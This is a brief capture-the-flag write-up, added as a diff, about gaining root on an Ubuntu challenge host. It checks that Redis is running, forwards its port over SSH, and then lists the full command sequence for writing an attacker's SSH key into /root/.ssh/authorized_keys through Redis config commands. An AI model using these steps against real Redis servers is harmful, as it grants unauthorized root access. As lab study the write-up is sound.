@@ -1,0 +1,15 @@
+1. Ubuntu 20.04
+2. /var/log/redis             => Redis might be running
+3. /etc/passwd has redis user =>         ...
+4. wget 127.0.0.1:6379 has response => Confirm Redis is running
+5. Do ssh local port forwarding: ssh -L 127.0.0.1:13338:127.0.0.1:6379 -p 32385 user@challenge.ctf.games
+6. Follow Hacktricks - Redis to do some enumeration.
+7. RCE
+	- ssh-keygen -t rsa
+	- (echo -e "\n\n"; cat ./id_rsa.pub; echo -e "\n\n") > spaced_key.txt
+	- cat spaced_key.txt | redis-cli -h 127.0.0.1 -x set ssh_key
+	- redis-cli -h 127.0.0.1
+		- config set dir /root/.ssh
+		- config set dbfilename "authorized_keys"
+		- save
+	- ssh -i id_rsa root@127.0.0.1
